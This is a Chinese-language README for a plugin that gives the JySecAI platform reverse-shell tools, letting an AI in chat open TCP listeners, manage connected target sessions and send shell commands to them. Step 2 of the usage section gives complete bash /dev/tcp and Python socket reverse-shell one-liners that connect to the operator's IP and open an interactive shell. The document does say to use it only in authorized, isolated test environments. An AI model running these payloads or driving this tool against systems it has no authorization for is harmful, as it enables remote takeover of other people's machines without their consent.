# 反向 Shell MCP

[English](README.md)

通过**外部 MCP** 为 JySecAI 增加**反向 Shell** 能力：开启/停止 TCP 监听、同时管理**多个已连接目标（session）**、向指定 session 下发命令，**无需修改后端代码**。通道带一次性握手 token 鉴别与可选来源 IP 白名单。

## 工具说明

| 工具 | 说明 |
|------|------|
| `reverse_shell_start_listener` | 在指定端口启动 TCP 监听（支持多目标同时连入）。可选 `allowed_ips` 来源 IP 白名单。返回一次性**握手 token**，目标端第一包必须包含它。 |
| `reverse_shell_stop_listener` | 停止监听并断开全部 session。 |
| `reverse_shell_status` | 查看状态：是否监听、端口、session 数量、客户端地址、IP 白名单。 |
| `reverse_shell_sessions` | 列出全部 session：`session_id`、来源 IP:端口、连接时间、状态，以及最近的拒绝/断开事件。 |
| `reverse_shell_send_command` | 向指定 session 发送命令并返回输出（上限 1MB）。`session_id` 可选：仅一个 session 时自动选用；多个时必须指定，否则报错并列出可选 id。 |
| `reverse_shell_disconnect` | 断开一个 session（`session_id` 可选，仅一个时自动选用），不影响监听与其他 session。 |

## 多 session 使用流程

1. `reverse_shell_start_listener(4444)` — 返回结果中包含握手 token，例如：
   `握手 token（一次性，重启监听会更换）: be82bb3c...`
   重启监听会生成新 token。
2. 在目标机上反弹连接，并**先发送 token 作为第一包**，再挂上 shell：
   - Linux bash：
     `bash -c 'exec 3<>/dev/tcp/你的IP/4444; echo TOKEN >&3; exec bash -i <&3 >&3 2>&3'`
   - Python：
     `python3 -c "import socket,os,subprocess;s=socket.socket();s.connect(('你的IP',4444));s.sendall(b'TOKEN');[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/bash','-i'])"`
   - 任何 payload 均可，只要连上后线上首包字节包含 token；该包中 token 之后的内容会被丢弃。
3. 用 `reverse_shell_sessions` 查看已连接目标及其 `session_id`、来源 IP、连接时间。
4. 只有一个 session 时可直接 `reverse_shell_send_command("id")`；多个时需指定 `session_id`，例如 `reverse_shell_send_command("id", session_id="sess-0002")`。
5. `reverse_shell_disconnect(session_id)` 只断开一个目标；`reverse_shell_stop_listener` 全部停止。

token 错误/缺失、或来源不在白名单的连接会被立即断开并记录；`reverse_shell_sessions` 可查看最近事件。

## 来源 IP 白名单

传入 `allowed_ips` 则仅接受名单内来源：

```
reverse_shell_start_listener(4444, allowed_ips=["10.0.0.8", "10.0.0.9"])
```

留空/不传则维持旧行为（接受任意来源）。IP 会做格式校验，存在无效项时拒绝启动。

## 依赖

- Python 3.10+
- 使用项目自带 venv 时已包含 `mcp`；单独运行需：`pip install mcp`

## 在 JySecAI 中接入

1. **路径**  
   例如项目根为 `/path/to/JySecAI-main`，则脚本路径为：  
   `/path/to/JySecAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py`

2. **Web 界面** → **设置** → **外部 MCP** → **添加外部 MCP**，填入以下 JSON（将路径替换为你的实际路径）：

```json
{
  "reverse-shell": {
    "command": "/path/to/JySecAI-main/venv/bin/python3",
    "args": ["/path/to/JySecAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py"],
    "description": "反向 Shell：带 token 鉴别的多 session 监听，向目标下发命令",
    "timeout": 60,
    "external_mcp_enable": true
  }
}
```

   - `command`：建议使用项目 **venv** 中的 Python，或系统 `python3`。
   - `args`：**必须使用绝对路径** 指向 `mcp_reverse_shell.py`。
   - 保存后点击该 MCP 的 **启动**，即可在对话中通过 AI 调用上述工具。

## 本地单独运行（可选）

```bash
# 在项目根目录，使用 venv
./venv/bin/python mcp-servers/reverse_shell/mcp_reverse_shell.py
```

进程通过 stdio 与 MCP 客户端通信；JySecAI 以 stdio 方式启动该脚本时行为相同。

## 测试

```bash
python3 mcp-servers/reverse_shell/test_multi_session.py
```

多 session 通道逻辑测试（token 接受/拒绝、多客户端同时在表、按 session 下发命令、自动选用与显式指定、1MB 输出上限、IP 白名单、资源清理）。缺少 `mcp`/`yaml` 时会自动注入最小 stub，无需安装第三方包。

## 安全提示

- 仅在有授权、隔离的测试环境中使用。
- 握手 token：每次 `start_listener` 生成一次性随机 token，目标端第一包必须包含，否则断开并记录。
- `allowed_ips`：来源 IP 白名单；为空表示接受任意来源（与旧行为一致）。
- 单次 `send_command` 输出上限 1MB，防止超大输出耗尽内存。
- 监听仍在 `0.0.0.0`，若端口对外暴露存在风险，请通过防火墙或网络策略限制访问。
